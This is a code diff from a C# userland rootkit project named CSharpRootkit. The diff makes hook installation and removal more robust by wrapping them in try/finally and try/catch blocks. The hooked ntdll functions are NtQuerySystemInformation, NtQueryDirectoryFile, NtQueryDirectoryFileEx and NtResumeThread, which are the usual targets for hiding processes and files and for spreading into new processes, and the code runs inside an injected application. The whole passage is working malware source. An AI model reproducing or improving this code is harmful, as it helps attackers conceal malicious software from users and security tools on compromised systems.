@@ -734,37 +734,40 @@ namespace CSharpRootkit
             }
 
             IntPtr[] PausedThreads=Utils.PauseAllThreadExceptCurrent();
+            try
+            {
+                IntPtr NtQuerySystemInformationPtr = Utils.GetFunctionPtr("ntdll.dll", "NtQuerySystemInformation");
+                Delegate tempDelegate = new NtQuerySystemInformationDelegate(NtQuerySystemInformationHook);
+                DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
+                IntPtr NtQuerySystemInformationPtrHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
+                contextManager["NtQuerySystemInformation"] = new NativeFunctionHooker(NtQuerySystemInformationPtr, NtQuerySystemInformationPtrHookPtr);
+                OriginalNtQuerySystemInformation = contextManager["NtQuerySystemInformation"].InstallHook<NtQuerySystemInformationDelegate>();
 
-            IntPtr NtQuerySystemInformationPtr = Utils.GetFunctionPtr("ntdll.dll", "NtQuerySystemInformation");
-            Delegate tempDelegate = new NtQuerySystemInformationDelegate(NtQuerySystemInformationHook);
-            DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
-            IntPtr NtQuerySystemInformationPtrHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
-            contextManager["NtQuerySystemInformation"] = new NativeFunctionHooker(NtQuerySystemInformationPtr, NtQuerySystemInformationPtrHookPtr);
-            OriginalNtQuerySystemInformation=contextManager["NtQuerySystemInformation"].InstallHook<NtQuerySystemInformationDelegate>();
-            
-            IntPtr NtQueryDirectoryFilePtr = Utils.GetFunctionPtr("ntdll.dll", "NtQueryDirectoryFile");
-            tempDelegate = new NtQueryDirectoryFileDelegate(NtQueryDirectoryFileHook);
-            DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
-            IntPtr NtQueryDirectoryFileHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
-            contextManager["NtQueryDirectoryFile"] = new NativeFunctionHooker(NtQueryDirectoryFilePtr, NtQueryDirectoryFileHookPtr);
-            OriginalNtQueryDirectoryFile = contextManager["NtQueryDirectoryFile"].InstallHook<NtQueryDirectoryFileDelegate>();
-            
-            IntPtr NtQueryDirectoryFileExPtr = Utils.GetFunctionPtr("ntdll.dll", "NtQueryDirectoryFileEx");
-            tempDelegate = new NtQueryDirectoryFileExDelegate(NtQueryDirectoryFileExHook);
-            DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
-            IntPtr NtQueryDirectoryFileHookExPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
-            contextManager["NtQueryDirectoryFileEx"] = new NativeFunctionHooker(NtQueryDirectoryFileExPtr, NtQueryDirectoryFileHookExPtr);
-            OriginalNtQueryDirectoryFileEx = contextManager["NtQueryDirectoryFileEx"].InstallHook<NtQueryDirectoryFileExDelegate>();
-            
-            IntPtr NtResumeThreadPtr = Utils.GetFunctionPtr("ntdll.dll", "NtResumeThread");
-            tempDelegate = new NtResumeThreadDelegate(NtResumeThreadHook);
-            DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
-            IntPtr NtResumeThreadHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
-            contextManager["NtResumeThread"] = new NativeFunctionHooker(NtResumeThreadPtr, NtResumeThreadHookPtr);
-            OriginalNtResumeThread = contextManager["NtResumeThread"].InstallHook<NtResumeThreadDelegate>();
+                IntPtr NtQueryDirectoryFilePtr = Utils.GetFunctionPtr("ntdll.dll", "NtQueryDirectoryFile");
+                tempDelegate = new NtQueryDirectoryFileDelegate(NtQueryDirectoryFileHook);
+                DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
+                IntPtr NtQueryDirectoryFileHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
+                contextManager["NtQueryDirectoryFile"] = new NativeFunctionHooker(NtQueryDirectoryFilePtr, NtQueryDirectoryFileHookPtr);
+                OriginalNtQueryDirectoryFile = contextManager["NtQueryDirectoryFile"].InstallHook<NtQueryDirectoryFileDelegate>();
 
+                IntPtr NtQueryDirectoryFileExPtr = Utils.GetFunctionPtr("ntdll.dll", "NtQueryDirectoryFileEx");
+                tempDelegate = new NtQueryDirectoryFileExDelegate(NtQueryDirectoryFileExHook);
+                DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
+                IntPtr NtQueryDirectoryFileHookExPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
+                contextManager["NtQueryDirectoryFileEx"] = new NativeFunctionHooker(NtQueryDirectoryFileExPtr, NtQueryDirectoryFileHookExPtr);
+                OriginalNtQueryDirectoryFileEx = contextManager["NtQueryDirectoryFileEx"].InstallHook<NtQueryDirectoryFileExDelegate>();
 
-            Utils.ResumeAndCloseAllThreads(PausedThreads);
+                IntPtr NtResumeThreadPtr = Utils.GetFunctionPtr("ntdll.dll", "NtResumeThread");
+                tempDelegate = new NtResumeThreadDelegate(NtResumeThreadHook);
+                DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
+                IntPtr NtResumeThreadHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
+                contextManager["NtResumeThread"] = new NativeFunctionHooker(NtResumeThreadPtr, NtResumeThreadHookPtr);
+                OriginalNtResumeThread = contextManager["NtResumeThread"].InstallHook<NtResumeThreadDelegate>();
+            }
+            finally 
+            {
+                Utils.ResumeAndCloseAllThreads(PausedThreads);
+            }
 
 
 
@@ -779,10 +782,19 @@ namespace CSharpRootkit
                 return;
             }
             IntPtr[] PausedThreads = Utils.PauseAllThreadExceptCurrent();
-            foreach (NativeFunctionHooker i in contextManager.Values) 
+
+            foreach (NativeFunctionHooker i in contextManager.Values)
             {
-                i.RemoveHook();
+                try//this cannot be allowed to error or else something is going to be frozen and fuck things up (in the injected application)
+                {
+                    i.RemoveHook();
+                }
+                catch 
+                { 
+                
+                }
             }
+
             Utils.ResumeAndCloseAllThreads(PausedThreads);
             contextManager.Clear();
             DelgateCache.Clear();
